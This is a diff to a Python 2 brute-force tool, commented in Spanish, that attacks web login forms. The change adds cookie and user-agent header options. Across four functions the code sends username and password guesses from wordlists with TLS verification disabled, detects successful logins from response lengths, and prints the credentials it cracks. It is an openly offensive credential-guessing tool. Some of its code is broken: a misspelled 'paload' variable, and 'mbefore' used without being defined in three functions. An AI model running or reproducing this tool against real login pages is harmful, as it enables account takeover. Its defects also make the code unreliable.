@@ -9,23 +9,82 @@ from termcolor import colored
 
 
 
-def single(url, userField, passField, user, pwd, userFile, pwdFile, message, verbose):
+def single(url, userField, passField, user, pwd, userFile, pwdFile, message, verbose,cookie,agent):
+	
 	print colored("\nBeginning BruteForce", 'yellow')
 	mbefore = message
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	reqadm1 = requests.post(url,payadm1, verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm1 = requests.post(url,payadm1, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	reqadm2 = requests.post(url,payadm2,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm2 = requests.post(url,payadm2, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
+	
 	
 	payadm3 = {userField: '12', passField: ''}
-	reqadm3 = requests.post(url,payadm3,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm3 = requests.post(url,payadm3, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
 	
 	payload = { userField : user, passField: pwd}
-	r = requests.post(url, payload, verify=False)
-
+	if len(cookie) == 0 and len(agent) == 0:
+		r = requests.post(url,payload, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		r = requests.post(url,payload,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		r = requests.post(url,payload, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		r = requests.post(url,payload, cookies = cookies, headers = headers, verify=False)
+	
+	
 	if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
 		if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
 			if int(verbose) == 1:
@@ -74,19 +133,61 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message, ver
 				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
 		
 		
-def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose):
+def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent):
 	print colored("\nBeginning BruteForce", 'yellow')
 	users = []
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	reqadm1 = requests.post(url,payadm1, verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm1 = requests.post(url,payadm1, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	reqadm2 = requests.post(url,payadm2,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm2 = requests.post(url,payadm2, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
 	
 	payadm3 = {userField: '12', passField: ''}
-	reqadm3 = requests.post(url,payadm3,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm3 = requests.post(url,payadm3, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
 
 	if os.path.exists(userFile): #archivo con usuarios
 		fo = open(userFile, 'r')
@@ -99,7 +200,22 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 				
 			#Login
 			payload = { userField : users[i].rstrip('\n'), passField: pwd}
-			r = requests.post(url, data= payload, verify=False)
+			if len(cookie) == 0 and len(agent) == 0:
+				r = requests.post(url,data = payload, verify=False)
+		
+			elif len(cookie) == 0 and len(agent) > 0:
+				headers = {'user-agent': agent}
+				r = requests.post(url,data = payload,headers = headers, verify=False)
+			
+			elif len(cookie) > 0 and len(agent) == 0:
+				cookies = dict(cookies_are=cookie) 
+				r = requests.post(url,data = payload, cookies = cookies, verify=False)
+		
+			elif len(cookie) > 0  and len(agent) > 0:
+				headers = {'user-agent': agent}
+				cookies = dict(cookies_are=cookie) 
+				r = requests.post(url,data = paload, cookies = cookies, headers = headers, verify=False)
+				
 			
 			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
 				if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
@@ -149,20 +265,62 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 					elif int(verbose) == 3:
 						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
 	
-def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose):
+def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent):
 	print colored("\nBeginning BruteForce", 'yellow')
 	passwords = []
 	
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	reqadm1 = requests.post(url,payadm1, verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm1 = requests.post(url,payadm1, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	reqadm2 = requests.post(url,payadm2,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm2 = requests.post(url,payadm2, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
 	
 	payadm3 = {userField: '12', passField: ''}
-	reqadm3 = requests.post(url,payadm3,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm3 = requests.post(url,payadm3, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
 	
 	if os.path.exists(pwdFile): #archivo con usuarios
 		fo = open(pwdFile, 'r')
@@ -176,7 +334,21 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ver
 		
 			#Login
 			payload = { userField : user, passField: passwords[i].rstrip('\n')}
-			r = requests.post(url, data= payload, verify=False)
+			if len(cookie) == 0 and len(agent) == 0:
+				r = requests.post(url,data = payload, verify=False)
+		
+			elif len(cookie) == 0 and len(agent) > 0:
+				headers = {'user-agent': agent}
+				r = requests.post(url,data = payload,headers = headers, verify=False)
+		
+			elif len(cookie) > 0 and len(agent) == 0:
+				cookies = dict(cookies_are=cookie) 
+				r = requests.post(url,data = payload, cookies = cookies, verify=False)
+		
+			elif len(cookie) > 0  and len(agent) > 0:
+				headers = {'user-agent': agent}
+				cookies = dict(cookies_are=cookie) 
+				r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 			
 			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
 				if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
@@ -227,7 +399,7 @@ def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ver
 						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
 
 	
-def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose):
+def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent):
 	print colored("\nBeginning BruteForce", 'yellow')
 	users = []
 	passwords = []
@@ -237,13 +409,55 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 	requests.packages.urllib3.disable_warnings()		
 	
 	payadm1 = {userField: '', passField: ''}
-	reqadm1 = requests.post(url,payadm1, verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm1 = requests.post(url,payadm1, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
 	
 	payadm2 = {userField: '1', passField: ''}
-	reqadm2 = requests.post(url,payadm2,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm2 = requests.post(url,payadm2, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
 	
 	payadm3 = {userField: '12', passField: ''}
-	reqadm3 = requests.post(url,payadm3,verify=False)
+	if len(cookie) == 0 and len(agent) == 0:
+		reqadm3 = requests.post(url,payadm3, verify=False)
+		
+	elif len(cookie) == 0 and len(agent) > 0:
+		headers = {'user-agent': agent}
+		reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
+		
+	elif len(cookie) > 0 and len(agent) == 0:
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
+		
+	elif len(cookie) > 0  and len(agent) > 0:
+		headers = {'user-agent': agent}
+		cookies = dict(cookies_are=cookie) 
+		reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
 	
 	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
 		
@@ -265,7 +479,21 @@ def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,
 				#Login
 				
 				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
-				r = requests.post(url, data= payload, verify=False)
+				if len(cookie) == 0 and len(agent) == 0:
+					r = requests.post(url,data = payload, verify=False)
+		
+				elif len(cookie) == 0 and len(agent) > 0:
+					headers = {'user-agent': agent}
+					r = requests.post(url,data = payload,headers = headers, verify=False)
+		
+				elif len(cookie) > 0 and len(agent) == 0:
+					cookies = dict(cookies_are=cookie) 
+					r = requests.post(url,data = payload, cookies = cookies, verify=False)
+		
+				elif len(cookie) > 0  and len(agent) > 0:
+					headers = {'user-agent': agent}
+					cookies = dict(cookies_are=cookie) 
+					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
 			
 				if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
 					if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
